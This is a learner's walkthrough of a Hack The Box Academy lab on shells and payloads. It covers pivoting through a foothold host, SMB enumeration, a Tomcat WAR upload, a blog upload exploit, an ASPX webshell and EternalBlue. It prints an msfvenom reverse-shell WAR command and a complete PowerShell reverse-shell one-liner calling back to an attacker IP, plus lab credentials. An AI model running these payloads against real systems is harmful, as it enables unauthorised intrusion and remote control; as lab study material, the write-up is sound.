---
platform: hackthebox
difficulty: unknown
status: Completed
date: 2026-09-02
tags:
---
# HTB: Shells & Payloads / The Live Engagement

**Targets:** `172.16.1.11:8080` , `172.16.1.13`  , `blog.inlanefreight.local`

**Foothold-Host:** `10.129.188.13`
**Credentials:** `htb-student` / `HTB_@cademy_stdnt!` Can be used by RDP.

---

## 01 - Scope
### Assignment:
CAT5's team has secured a foothold into Inlanefreight's network for us. Our responsibility is to examine the results from the recon that was run, validate any info we deem necessary, research what can be seen, and choose which exploit, payloads, and shells will be used to control the targets. Once on the VPN or from your Pwnbox, we will need to RDP into the foothold host and perform any required actions from there. Below you will find any credentials, IP addresses, and other info that may be required.
### Objectives:
- Demonstrate your knowledge of exploiting and receiving an interactive shell from a `Windows host or server`.
- Demonstrate your knowledge of exploiting and receiving an interactive shell from a `Linux host or server`.
- Demonstrate your knowledge of exploiting and receiving an interactive shell from a `Web application`.
- Demonstrate your ability to identify the `shell environment` you have access to as a user on the victim host.


- **Primary Goals:**
  - [x] Hostname of `Host-01`
  - [x] Name of the folder located in `C:\Shares\`
  - [x] Linux distribution of `Host-02`
  - [x] What language is the shell written in that gets uploaded when using the `50064.rbexploit`?
  - [x] Exploit the blog site and establish a shell session with the target OS. Submit the contents of `/customscripts/flag.txt`
  - [x] Hostname of `Host-03`
  - [x] Exploit and gain a shell session with Host-3. Then submit the contents of `C:\Users\Administrator\Desktop\Skills-flag.txt`


![](/00-Meta/Objects/Pictures/Pasted%20image%2020260902110624.png)

---

## 02 - Procedure
1. Connect to the Foothold-Host:
```bash
xfreerdp /v:10.129.188.13 /u:htb-student /p:HTB_@cademy_stdnt! /dynamic-resolution
```

2. I first wanted to make sure, how we are connected to the server-subnet (since our RDP-IP is form another subnet). Alright, we have our own IP "**172.16.1.5**". Which means, there's no routing to consider and also no vlans separating us from the server-subnet.
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260902112451.png)

3. To make life much easier I setup a ligolo tunnel to the foothold-machine. Which allows me to enumerate from my local attack-machine, thus providing me with all my tools. I downloaded the "ligolo-agent" via a local python http server (on my attack-box), started the agent and connected back to my attack-box. Then I manually added the route to the server-subnet and confirmed connectivity via a simple ping:

![](/00-Meta/Objects/Pictures/Pasted%20image%2020260902144411.png)


![](/00-Meta/Objects/Pictures/Pasted%20image%2020260902143902.png)

4. Afterwards I did a fast and a extensive nmap scan for Host 01 and 03. Which provided us their hostnames `SHELLS-WINSVR`and`SHELLS-WINBLUE` and thus allowed us to complete two goals:
`HOST-01:`
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260902150200.png)

`HOST-03:`
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260902150644.png)

5. Since the Foothold client couldn't resolve the name of HOST-02 using `nslookup` and a standard `Nmap ping sweep` didn't work through the ligolo tunnel, I ran an `Nmap host discovery` scan. By process of elimination, it was easy to determine that the IP `172.16.1.12` belonged to the host `blog.inlanefreight.local` (simply guessing would have done the trick as well ^^). 
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260902152829.png)

6. I then also carried out a fast and a extensive nmap scan for the HOST-02, which provided me with the linux-distribution `ubuntu` :
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260902153638.png)

7. After examining the Nmap-Scans, I started enumerating SMB of HOST-01. `Users` and `dev-share` look promising:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260902155212.png)

8. Alright, we can access the `Users` share:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260902155858.png)

9.  I successfully logged in to the smbshare  `Users` via "smbclient" and examined/crawled the directories and "files", which consisted mostly out of ".lnk" files without any interesting user direcotries:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260902175815.png)

10. I checked some of them in a Hex-Editor, but to be honest, this didn't really help on my current skill-level:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260902180610.png)

11. `Host-03` didn't had any useful shares either:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260902181220.png)

12. For now, I've put SMB on hold to look for other low-hanging fruit. I checked  a couple of approaches, such as OS CVE, webserver versions and engines, etc.  After a while I realized, that I didn't check the obvious, in other words, the `Foothold-client`. There is a credential file located on the desktop, which can be utilized to login to the HOST-01 and Blog:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260903082128.png)

13. After login I saw, that it is possible to upload .war files. I then checked if this can be abused and checkpot: https://medium.com/@mingihongkim/exploiting-java-portlets-with-a-malicious-war-file-to-gain-a-reverse-shell-2504909f71c1

14. I created the .war payload and tried to upload it, which unfortunately didn't work. According to the error message, we will need access to the server to either upload it from there or change the `context.xml` file:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=4444 -f war > reverse.war
```

![](/00-Meta/Objects/Pictures/Pasted%20image%2020260903101056.png)

15. To be honest, after a lot of "troubleshooting" I checked a walkthrough (https://medium.com/@nathawutrock/shells-payloads-the-live-engagement-htb-academy-edae7e30e108) and realized, that the .war upload should work, but is probably denied by some sort of ACL. After that I continued without the walkthrough.

16. I uploaded the payload (via http.server) to the `Foothold-Host` , placed it on the `TomcatServer`, started socat on the "Foothold-Host" and connected back to my Attack-box:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260903123928.png)

17. That way I was able to figure out the foldername `dev-share` located in `C:\Shares`:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260903124245.png)

18. I then checked if there are any other files (like ssh-key) which could be valuable and moved on to the `HOST-02`, since I've got the login credentials for the blog.
19. "Slade Wilson" posted, that he believes, he found a vulnerability in this blog:https://www.exploit-db.com/exploits/50064
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260903154932.png)

20. I then enumerated the vhost further in order to verfiy the "lightweight facebook-styled blog" and instead retrieved the root credentials of DB `root`  `HTB_@cademy_r00t!` which I'm happy to note down for later. The only hint I have so far regarding the "facebook styled blog" is the website Icon:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260903161117.png)

![](/00-Meta/Objects/Pictures/Pasted%20image%2020260903161200.png)

21. Since the exploit comes from a well-known site and there's a good chance it works, I added it to my Metasploit library and tested it anyways:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260903162842.png)

22. I tried it with the "ReverseListener.." attributes, but didn't get it to create a session.
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260903171512.png)

23. At least as we can see in the picture above, the upload of the shell was successful (and pointing to the `Fooothold-Host`). I therefore continued "manually" and grabbed the  `/customscripts/flag.txt`:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260903173001.png)

24. Continuing with the last server and Goal. When browsing the website, there's already a hint, that there could be an upload vulnerability:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260903180507.png)
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260903180525.png)

25. So, I customized a pre-made ASPX shell from Laudanum uploaded it...
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260903181324.png)

26. ... and was able to gain a shell. But I didn't had sufficient rights:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260903181744.png)

27. I then executed following payload in the webshell to gain a reverseshell and connected to it:
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object Net.Sockets.TcpClient('172.16.1.5',4446);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

28. Afterwards I checked the `windows build` and `Hotfixes` in order to gain public available information about present vulnerabilities (especially Privilege Escalation):
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260904111233.png)

29. I then fed the output to WES-NG and received a good amount of present "Privilege Escalation" CVE's:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260904111416.png)

30. I researched many of the found exploits and their corresponding attack-chains and quickly realized, that they are out of my league for now and decided to take the hint from HTB:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260904163350.png)
31. HTB is probably hinting towards "Etneral Blue" which was a topic in previous chapter. I therefor started enumerating SMB on "HOST-03" again:
32. So I checked if the vulnerability is present... and it is:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260904161151.png)

33. I then used the `Eternal BLue` Payload of "metasploit" to establish a connection to the server and retrieve the flag `One-H0st-Down!`:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260904164757.png)

## 03 - Lesson Learned
This exercise was very rewarding. I was able to familiarize myself with many new mechanisms and tools, and now have a more precise approach, especially for Windows CVEs. Here's what I've learned:
1. `SMB` For future penetration tests, I'll keep in mind that basically every Windows system (build & hotfixes) with SMBv1 older than 2017 is affected by `Eternal Blue`.
2. `ilgolo` is a very powerful tool that allows you to use your own machine and tools for further scans and attacks. However, it should be used with caution, as the routing subject (especially within an existing VPN tunnel, such as the one in the HTB Labs) can quickly become very complex.
3. `Socat` is a really nice tool which allows you to setup a DNAT or SNAT for single ports.
4. `WES-NG` lets you find present Windows-CVE's easily, when the build and OS is known. 